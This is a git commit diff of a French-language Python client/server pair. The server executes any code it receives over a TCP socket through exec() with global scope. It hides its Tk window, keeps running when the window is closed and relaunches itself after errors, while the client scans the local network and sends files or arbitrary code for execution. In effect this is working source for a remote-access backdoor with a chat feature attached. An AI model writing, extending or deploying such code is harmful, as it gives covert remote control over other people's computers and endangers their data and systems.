4c6364cca20d87054c49b266cfb96ce58821bfc0
Le Noir Moqueur <113031623+LeMoqueurNoir@users.noreply.github.com>
2022-09-21 21:58:04 +0200

    Add files via upload

--- client.py
+++ client.py
@@ -3,7 +3,8 @@ import socket
 import subprocess
 import threading
 import time
-import os as os
+import os
+
 
 searching = False  # If ip local network adresses haven't been ping for a long time
 
@@ -19,7 +20,7 @@ class IpPinger:
         print(self.dynamic_ips)
 
     def check_ip(self, ip):
-        if not "Impossible de joindre l’hôte de destination" in subprocess.check_output(f"ping {ip}",
+        if "Impossible de joindre l’hôte de destination" not in subprocess.check_output(f"ping {ip}",
                                                                                         shell=True).__str__():
             self.ips.append(ip)
 
@@ -31,6 +32,22 @@ class IpPinger:
         output = subprocess.check_output("arp -a", shell=True).__str__().strip()
         self.dynamic_ips = [info.split()[0] for info in output.split("\n")[2:] if "dynamique" in info]  # Using arp- a
         return self.dynamic_ips
+
+
+def find_ipv4():
+    output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
+    lines = output.split("\n")
+    ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
+    ipv4 = ""
+    i = len(ipv4_line) - 1
+    while True:
+        char = ipv4_line[i]
+        if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
+            break
+        ipv4 += char
+        i -= 1
+    ipv4 = ipv4[::-1]
+    return ipv4
 
 
 if searching:
@@ -58,17 +75,24 @@ class Commands:
         return open("commands/test.py", "r").read().encode("utf-8")
 
     def file(self):  # <file> ../../filename.py
+        if not os.path.exists(self.line):
+            print(f'File "{self.line}"' + ' doesn\'t exist !')
+            return ""
         return open(self.line, "r").read().encode("utf-8")
 
     def chat(self):  # <chat> username
-        pseudo = self.line
-        os.system(f"start /wait python chat_client.py {pseudo} {host}")
-        server = open("commands/chat_server.py").read()
-        return server.encode("utf-8")
+        pseudo = self.line.replace(" ", "")
+        if not pseudo:
+            pseudo = "MiraX"
+        subprocess.call(fr'start python commands\chat_client.py pseudo={pseudo} host={host}', shell=True)
+        return ("filename = os.path.basename(__file__)\nos.system(f'start /wait {\"python\" if \"py\" in filename else \"\"} {filename} type=chat ip_adress=" + find_ipv4() + "')").encode("utf-8")
 
     def script(self):  # <script> code_to_execute()
         return self.line.encode("utf-8")
 
+
+# start /wait python -c "exec(\"print('Hello World')\nimport time\ntime.sleep(10)\")"
+# fr'start /wait python -c "exec(\"{server}\")"'
 
 while True:
     input_user = input("Enter some data to send : ").strip()
@@ -77,6 +101,8 @@ while True:
         print("Parser didn't recognize the command used !")
         continue
     data = commands.run()  # Return the utf-8 encoded text to transfer using the socket protocol
+    if not data:
+        continue
 
     try:
         sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
--- server.py
+++ server.py
@@ -1,20 +1,117 @@
 # coding:utf-8
 
+import asyncio
+from colorama import *
 import socket
 import threading
 import subprocess
-import tkinter
+from tkinter import *
 import time
 import os
 import random
+import sys
 import keyboard
 import psutil
-import datetime
+import datetime as dt
 import base64
 import requests
 import sys
 import webbrowser
 import json
+init()
+
+if len(sys.argv) and "chat" in [args.strip().lower() for args in sys.argv]:
+
+    def get_args():
+        __type, _ip_adress = "", ""
+        for arg in sys.argv:
+            if "type=" in arg:
+                __type = "".join(arg.split("=")[1:])
+            if "ip_adress=" in arg:
+                _ip_adress = "".join(arg.split("=")[1:])
+        return __type, _ip_adress
+
+
+    _type, ip_adress = get_args()
+    print("\n" * 100)  # To erase any content
+
+
+    def find_ipv4():
+        output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
+        lines = output.split("\n")
+        ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
+        ipv4 = ""
+        i = len(ipv4_line)
+        while True:
+            i -= 1
+            char = ipv4_line[i]
+            if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
+                break
+            ipv4 += char
+        ipv4 = ipv4[::-1]
+        return ipv4
+
+
+    class ClientThread(threading.Thread):
+        def __init__(self, conn):
+            threading.Thread.__init__(self)
+            self.conn = conn
+
+        def run(self):
+            while True:
+                data = self.conn.recv(8192).decode("utf-8")
+                if not data:
+                    break
+                print(Fore.LIGHTGREEN_EX + data)
+            self.conn.close()
+
+
+    ipv4 = find_ipv4()
+    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host, port = "", 4287
+    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
+                  1)  # For the sk socket to be reusable multiple times without waiting delay
+    sk.bind((host, port))
+
+
+    def message(string):
+        return f"[{dt.datetime.now().strftime('%B %d %H:%M:%S')}] {ipv4} >>> {string}"
+
+
+    def send_message(s, msg):
+        msg = message(msg)
+        data = msg.encode("utf-8")  # Return the utf-8 encoded text to transfer using the socket protocol
+        s.sendall(data)
+        print(Fore.LIGHTGREEN_EX + msg)
+
+
+    def send():
+        while True:
+            input_user = input("").strip()
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip_adress, port))
+                send_message(s=s, msg=input_user)
+
+            except Exception as e:
+                print(e)
+            finally:
+                s.close()
+
+
+    def rcv():
+        while True:
+            sk.listen(5)
+            conn, address = sk.accept()
+            client_thread = ClientThread(conn)
+            client_thread.start()
+        conn.close()
+
+
+    threading.Thread(target=rcv).start()
+    send()
+    exit()
 
 
 def find_ipv4():
@@ -37,8 +134,8 @@ def remote(data):
     try:
         exec(data, globals())
         print("execution worked properly !")
-    except:
-        print("There was an error during execution")
+    except Exception as e:
+        print("There was an error during execution : ", e)
 
 
 class ClientThread(threading.Thread):
@@ -47,11 +144,16 @@ class ClientThread(threading.Thread):
         self.conn = conn
 
     def run(self):
+        data = ""
+        i = 0
         while True:
-            data = self.conn.recv(8192).decode("utf-8")
-            if not data:
+            i += 1
+            new = self.conn.recv(65536).decode("utf-8")  # New part of the data transferred by the socket
+            data += new
+            print(f"Executed for the {i} time : ", data)
+            if not new:
                 break
-            threading.Thread(target=lambda: remote(data)).start()
+        threading.Thread(target=lambda: remote(data)).start()
         self.conn.close()
 
 
@@ -63,10 +165,24 @@ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
 sk.bind((host, port))
 print(f"Server started on http://{ipv4}:{port}")
 
-while True:
-    sk.listen(5)
-    conn, address = sk.accept()
-    print(f"The client {address} just connected.")
-    client_thread = ClientThread(conn)
-    client_thread.start()
-sk.close()
+
+def start_server():
+    while True:
+        try:
+            sk.listen(5)
+            conn, address = sk.accept()
+            print(f"The client {address} just connected.")
+            client_thread = ClientThread(conn)
+            client_thread.run()
+        except Exception as e:
+            print(e)
+            os.system(f"python {os.getcwd()}\\{os.path.basename(__file__)}")
+    sk.close()
+
+
+threading.Thread(target=start_server).start()
+
+root = Tk()
+root.protocol("WM_DELETE_WINDOW", root.withdraw)
+root.withdraw()
+root.mainloop()
